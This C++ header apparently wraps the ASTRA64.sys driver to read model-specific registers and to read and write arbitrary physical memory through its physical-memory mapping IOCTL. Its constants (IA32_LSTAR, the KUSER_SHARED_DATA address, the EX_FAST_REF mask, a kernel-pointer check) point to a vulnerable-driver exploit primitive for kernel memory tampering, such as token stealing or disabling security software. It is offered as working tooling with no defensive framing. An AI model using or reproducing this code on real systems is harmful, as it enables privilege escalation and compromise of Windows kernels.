#pragma once
// ASTRA64.sys driver wrapper: open + MSR read + physical R/W via the driver's
// \Device\PhysicalMemory section mapping (IOCTL 0x80002008).
// Copied from D:\Sandboxie\Astra64-RW\cpp\astra.h (header-only, no changes).

#include <cstdint>
#include <cstring>
#include <stdexcept>
#include <string>
#include <vector>
#include <Windows.h>
#include <Psapi.h>

namespace astra {

constexpr const wchar_t* DEVICE_PATH     = L"\\\\.\\Astra32Device0";
constexpr const char*    SERVICE_NAME     = "ASTRA64";
constexpr const char*    DRIVER_FILENAME  = "ASTRA64.sys";

constexpr uint32_t IOCTL_MAP_PHYS  = 0x80002008;
constexpr uint32_t IOCTL_READ_MSR  = 0x800020EC;

constexpr uint32_t IA32_LSTAR       = 0xC0000082;
constexpr uint64_t EX_FAST_REF_MASK = 0xF;
constexpr uint64_t KUSD_VA          = 0xFFFFF78000000000ULL;

inline bool is_kptr(uint64_t v) {
    return v > 0xFFFF800000000000ULL && v < 0xFFFFFFFFFFFFFFF0ULL;
}

#pragma pack(push, 1)
struct MapInput {
    uint32_t interface_type;
    uint32_t bus_number;
    uint64_t physical_addr;
    uint32_t address_space;
    uint32_t size;
};
#pragma pack(pop)

class Astra {
    HANDLE dev_ = INVALID_HANDLE_VALUE;
    mutable uint64_t hint_high_ = 0;

    uintptr_t map_phys(uint64_t phys, uint32_t size) const {
        MapInput input{};
        input.physical_addr = phys;
        input.address_space = 0;
        input.size = size;

        DWORD ret = 0;
        if (!DeviceIoControl(dev_, IOCTL_MAP_PHYS,
                &input, sizeof(input), &input, sizeof(input), &ret, nullptr))
            return 0;

        uint64_t low = static_cast<uint64_t>(input.interface_type);
        if (low == 0) return 0;

        auto try_va = [&](uint64_t hi) -> uintptr_t {
            uint64_t cand = (hi << 32) | low;
            MEMORY_BASIC_INFORMATION mbi{};
            SIZE_T n = VirtualQuery(reinterpret_cast<void*>(cand), &mbi, sizeof(mbi));
            if (n > 0 && mbi.State == MEM_COMMIT)
                return static_cast<uintptr_t>(cand);
            return 0;
        };

        if (uintptr_t va = try_va(hint_high_)) return va;
        for (uint64_t hi = 0; hi < 0x8000ULL; ++hi) {
            if (hi == hint_high_) continue;
            if (uintptr_t va = try_va(hi)) {
                hint_high_ = hi;
                return va;
            }
        }
        return 0;
    }

    void unmap(uintptr_t va) const {
        UnmapViewOfFile(reinterpret_cast<void*>(va));
    }

    static bool safe_copy_from(const void* src, void* dst, size_t len) {
        SIZE_T read = 0;
        return ReadProcessMemory(GetCurrentProcess(), src, dst, len, &read)
               && read == len;
    }

public:
    Astra() = default;
    ~Astra() {
        if (dev_ != INVALID_HANDLE_VALUE) CloseHandle(dev_);
    }
    Astra(const Astra&) = delete;
    Astra& operator=(const Astra&) = delete;

    void open() {
        dev_ = CreateFileW(DEVICE_PATH,
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (dev_ == INVALID_HANDLE_VALUE)
            throw std::runtime_error("open " + std::string("device failed, GLE=") +
                                     std::to_string(GetLastError()));
    }

    uint64_t read_msr(uint32_t idx) const {
        uint8_t io[8]{};
        memcpy(io, &idx, 4);
        DWORD ret = 0;
        if (!DeviceIoControl(dev_, IOCTL_READ_MSR,
                io, 4, io, 8, &ret, nullptr))
            throw std::runtime_error("MSR IOCTL failed");
        uint64_t val;
        memcpy(&val, io, 8);
        return val;
    }

    void read_phys(uint64_t addr, void* buf, size_t len) const {
        auto dst = static_cast<uint8_t*>(buf);
        size_t pos = 0;
        uint64_t cur = addr;
        while (pos < len) {
            uint64_t page = cur & ~0xFFFULL;
            size_t off    = static_cast<size_t>(cur & 0xFFF);
            size_t chunk  = (std::min)(len - pos, size_t(0x1000) - off);
            uintptr_t va  = map_phys(page, 0x1000);
            if (!va)
                throw std::runtime_error("map_phys read 0x" + to_hex(page));
            if (!safe_copy_from(reinterpret_cast<void*>(va + off), dst + pos, chunk)) {
                unmap(va);
                throw std::runtime_error("phys read 0x" + to_hex(cur));
            }
            unmap(va);
            pos += chunk;
            cur += chunk;
        }
    }

    void write_phys(uint64_t addr, const void* buf, size_t len) const {
        auto src = static_cast<const uint8_t*>(buf);
        size_t pos = 0;
        uint64_t cur = addr;
        while (pos < len) {
            uint64_t page = cur & ~0xFFFULL;
            size_t off    = static_cast<size_t>(cur & 0xFFF);
            size_t chunk  = (std::min)(len - pos, size_t(0x1000) - off);
            uintptr_t va  = map_phys(page, 0x1000);
            if (!va)
                throw std::runtime_error("map_phys write 0x" + to_hex(page));
            memcpy(reinterpret_cast<void*>(va + off), src + pos, chunk);
            unmap(va);
            pos += chunk;
            cur += chunk;
        }
    }

    uint32_t read_u32(uint64_t pa) const {
        uint32_t v; read_phys(pa, &v, 4); return v;
    }
    uint64_t read_u64(uint64_t pa) const {
        uint64_t v; read_phys(pa, &v, 8); return v;
    }
    void write_u64(uint64_t pa, uint64_t v) const {
        write_phys(pa, &v, 8);
    }

private:
    static std::string to_hex(uint64_t v) {
        char buf[20];
        snprintf(buf, sizeof(buf), "%llX", static_cast<unsigned long long>(v));
        return buf;
    }
};

} // namespace astra
